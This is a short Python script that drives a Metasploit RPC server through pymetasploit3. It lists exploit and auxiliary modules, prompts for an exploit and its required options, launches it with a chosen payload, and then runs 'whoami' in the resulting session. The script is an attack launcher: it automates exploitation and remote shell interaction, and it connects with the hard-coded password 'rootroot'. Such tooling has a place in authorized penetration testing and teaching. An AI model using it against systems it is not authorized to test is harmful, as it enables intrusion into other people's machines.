from pymetasploit3.msfrpc import *

def list_all(client,data):
	if "exploits" in data:
		listing_exps=client.modules.exploits
		for i in listing_exps:
			print (i)
	elif "auxiliary" in data:
		listing_auxs=client.modules.auxiliary
		for i in listing_auxs:
			print (i)

def list_service(client,data):

	services = input ("Enter the service name you want to list: \n")
	if "exploits" in data:
		listing_exp=client.modules.exploits
		matches=[match for match in listing_exp if services in match]
		for i in matches:
			print (i)
	elif "auxiliary" in data:
		listing_aux=client.modules.auxiliary
		matches=[match for match in listing_aux if services in match]
		for i in matches:
			print (i)

def exploiting(client):

	exploit_name= input ("Enter the exploit name that you want to use: \n")
	exploit = client.modules.use('exploit', exploit_name)
	requires_opt=exploit.missing_required
	for i in requires_opt:
		get_required= input ("Enter {} \n" .format(requires_opt[0]))
		exploit[requires_opt[0]]=get_required
		requires_opt=exploit.missing_required
	list_payloads=exploit.targetpayloads()
	for i in list_payloads:
		print ("Supported payload :" + " " + i)
	exe_payload= input ("Enter the payload to execute: \n")
	exploit.execute(payload=exe_payload)
	list_exploit=client.sessions.list
	print (list_exploit)

def int_shell(client):

	print ("Interacting with user")
	shell_id = input ("enter the ID received: \n")
	shell = client.sessions.session(shell_id)
	shell.write('whoami')
	print("You are logged in as:" , shell.read())

def main():
	client = MsfRpcClient('rootroot', port=55553)
	data = input("Enter the module you want to list: (For ex:- exploits or auxiliary) \n")
	users = input ("Do you want to list whole list of module (Enter y or n) \n")
	if "y" in users:
		list_all(client,data)
	elif "n" in users:
		list_service(client,data)
	ask_exploit = input ("You want to exploit the target (Enter y or n) \n")
	if "y" in ask_exploit:
		exploiting(client)
	int_shell(client)


if __name__ == "__main__":
    main()
